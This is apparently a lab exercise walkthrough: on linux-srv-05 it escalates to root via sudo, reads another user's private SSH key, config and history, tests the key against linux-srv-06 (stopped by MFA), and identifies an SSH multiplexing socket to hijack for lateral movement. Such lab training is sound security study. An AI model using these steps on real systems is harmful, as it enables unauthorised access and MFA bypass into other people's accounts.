# Accessing `linux-srv-05`

## Login as `carol`

We are still logged in on `linux-srv-05` as `carol`:

```shell-session
carol@linux-srv-05:~$ hostname
linux-srv-05.nullbyte.internal

carol@linux-srv-05:~$ id
uid=1000(carol) gid=1000(carol) groups=1000(carol),27(sudo)
```

## Flag

Get the flag:

```
carol@linux-srv-05:~$ cat /flag.txt 
ssh-labs{agent-smith-helped-you}
```

## Information Gathering Users

Get the users:

```shell-session
carol@linux-srv-05:~$ getent passwd
root:x:0:0:root:/root:/bin/bash
[...]
carol:x:1000:1000::/home/carol:/bin/bash
dave:x:1001:1001::/home/dave:/bin/bash
```

- There is a user `dave`.

Check running processes:

```shell-session
carol@linux-srv-05:~$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 13:30 ?        00:00:00 bash /srv/entrypoint
root           8       1  0 13:30 ?        00:00:00 sshd: /usr/sbin/sshd -E /var/log/sshd [listener] 0 of 10-100 startup
root           9       1  0 13:30 ?        00:00:00 su - dave -c /srv/ssh-session-multiplexing-dave
root          10       1  0 13:30 ?        00:00:01 tail -f /dev/null
dave          12       9  0 13:30 ?        00:00:00 bash /srv/ssh-session-multiplexing-dave
dave          16      12  0 13:30 ?        00:00:00 sshpass -v -P Verification code: -p        -- ssh -tt linux-srv-06
dave          17      16  0 13:30 pts/0    00:00:00 ssh -tt linux-srv-06
dave          20       1  0 13:30 ?        00:00:00 ssh: /home/dave/.ssh/cm-dave-linux-srv-06-22 [mux]
root          25       8  0 17:23 ?        00:00:00 sshd-session: carol [priv]
carol         30      25  0 17:23 ?        00:00:00 sshd-session: carol@pts/1
carol         31      30  0 17:23 pts/1    00:00:00 -bash
carol         51      31  0 17:28 pts/1    00:00:00 ps -ef
```

- `dave` is logged in on this system.

Check `sudo` permissions:

```shell-session
carol@linux-srv-05:~$ sudo -l
Matching Defaults entries for carol on linux-srv-05:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User carol may run the following commands on linux-srv-05:
    (ALL : ALL) NOPASSWD: ALL
```

- `carol` can execute all commands as `root`.

## Information Gathering User `dave`

Start a shell as `root`:

```shell-session
carol@linux-srv-05:~$ sudo -i

root@linux-srv-05:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Check the home directory of `dave`:

```shell-session
root@linux-srv-05:~# cd /home/dave/
root@linux-srv-05:/home/dave# ls -la
total 44
drwx------ 1 dave dave 4096 Sep  9 18:33 .
drwxr-xr-x 1 root root 4096 Sep  9 18:33 ..
-rw------- 1 dave dave 2009 Sep  9 18:31 .bash_history
-rw------- 1 dave dave  220 Sep  9 13:02 .bash_logout
-rw------- 1 dave dave 1590 Sep  9 13:02 .bashrc
-rw------- 1 dave dave  807 Sep  9 13:02 .profile
drwx------ 1 dave dave 4096 Sep 10 13:30 .ssh
-rw------- 1 dave dave 3014 Sep  9 13:02 .viminfo

root@linux-srv-05:/home/dave# ls -la .ssh
total 36
drwx------ 1 dave dave 4096 Sep 10 13:30 .
drwx------ 1 dave dave 4096 Sep  9 18:33 ..
srw------- 1 dave dave    0 Sep 10 13:30 cm-dave-linux-srv-06-22
-rw------- 1 dave dave  112 Sep  9 17:51 config
-rw------- 1 dave dave  411 Sep  9 17:54 id_ed25519
-rw------- 1 dave dave   99 Sep  9 17:54 id_ed25519.pub
-rw------- 1 dave dave  891 Sep 10 13:30 known_hosts
-rw------- 1 dave dave  151 Sep  9 13:02 known_hosts.old
```

- There is a private key `id_ed25519`.
- There is a `known_hosts` file.
- There is a personal SSH config file `config`.
- There is a socket file `cm-dave-linux-srv-06-22`.

Show the known_hosts file:

```shell-session
root@linux-srv-05:~# cat .ssh/known_hosts
#
# ~/.ssh/known_hosts
#

linux-srv-06.nullbyte.internal,linux-srv-06 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIERFxT6sC+2B4sOlAGlWkDmw15ES/vHftvMHoJ/NuZfh
linux-srv-06 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9TLwiKayMFN58VHzXrPg+tvE0ch+/uo4ag5QUv3XjexwWR7ufmv1idDDLJXs2DdjJSEZVMhMHLNP1Qje8Zu1fy0B+z2e2BeFiGLpcCfAczD6UZgGHAWuzSCw44IvfBl0UsOKLzaKPu1ST8OkKoljrX1ngVtnKQfcAV7jbsDTFqnBW5oduEToR7aRJBeZgp3dRNBzzJ1zWXEZpKIKePS+Eoixd0OIwwieU+VaMbg3zMJfgbNktUOiDL43UxV1LnlBnF2ZLiO1RMBO0DO934Egck5yfncVE9msQ69mxNk9lukUCPNuVYkg4C/j9Rm9MnUyIyDLE2yOLSFY/Pd9oatGHekGV+rrcBptw11g7DPdFNdAc+BOfkAUvZ896MGbBIRGVYBuoNiHPJMb9Vfh2OJPqPxjG4td0cnboKZQX/rIy8hCuUPUC9CcrpTWDBSwy4yRs0XxSxTzE7OxS5KhBrd8Nb6gVTtbPOqDs9dleicf5Umqw3OYjVSI+wh+/o/RNKw0=
linux-srv-06 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMRgaoLaGCdF2LB+kmIUGFGu8qUSOX4r6zHERGA8CPejI83neMEvsqUEHqaFpVHsbfVEWN0oB6UfcaVp/MWDzUU=
```

- The user `dave` probably connected to `linux-srv-06`.

Check the shell history:

```shell-session
root@linux-srv-05:~# grep ssh .bash_history 
ssh linux-srv-06
```

- This confirms that `dave` probably connected to `linux-srv-06`.

Check if the private key of `dave` is password protected:

```shell-session
root@linux-srv-05:/home/dave# ssh-keygen -y -f .ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJa5uzSPwuxG1Yu/CIrymKxzIkp+HGLGDDtj5/Mknvlj dave@linux-srv-05
```

- The public key could be derived from the private key without entering a password. Therefore, the private key is not password protected.

## Authentication Configuration of `linux-srv-05`

Try to connect to `linux-srv-06` as `dave` using the SSH keys of `dave`:

```shell-session
root@linux-srv-05:/home/dave# ssh -v -i .ssh/id_ed25519 dave@linux-srv-06
[...]
debug1: Authentications that can continue: publickey
debug1: Next authentication method: publickey
debug1: Will attempt key: .ssh/id_ed25519 ED25519 SHA256:/qM8Kw1JwTx/ijOG6k1Z2ILe/l2/K0lyAr0/zUGLqW8 explicit
debug1: Offering public key: .ssh/id_ed25519 ED25519 SHA256:/qM8Kw1JwTx/ijOG6k1Z2ILe/l2/K0lyAr0/zUGLqW8 explicit
debug1: Server accepts key: .ssh/id_ed25519 ED25519 SHA256:/qM8Kw1JwTx/ijOG6k1Z2ILe/l2/K0lyAr0/zUGLqW8 explicit
Authenticated using "publickey" with partial success.
debug1: Authentications that can continue: keyboard-interactive
debug1: Next authentication method: keyboard-interactive
(dave@linux-srv-06) Verification code: 
^C
```

- The key `id_ed25519` of `dave` was offered.
- This key was accepted by the server.
- Authentication with the key was successful, however after this, the keyboard-interactive authentication method asked for a verification code (MFA).

## SSH Config of `dave`

Check the SSH config of `dave`:

```shell-session
root@linux-srv-05:/home/dave# cat .ssh/config 
#
# ~/.ssh/config
#

Host linux-srv-06
  ControlMaster auto
  ControlPath ~/.ssh/cm-%r-%h-%p
  ControlPersist 0
```

- SSH multiplexing is used.
- Control sockets are stored in `/home/dave/.ssh/`. This is the socket we have already seen before.

List the socket:

```shell-session
root@linux-srv-05:/home/dave# ls -l .ssh/cm*
srw------- 1 dave dave 0 Sep 10 13:30 .ssh/cm-dave-linux-srv-06-22
```

- The socket name indicates that this is a socket to access `linux-srv-06`.

If the socket is still active, it could be hijacked to get a shell on `linux-srv-06`.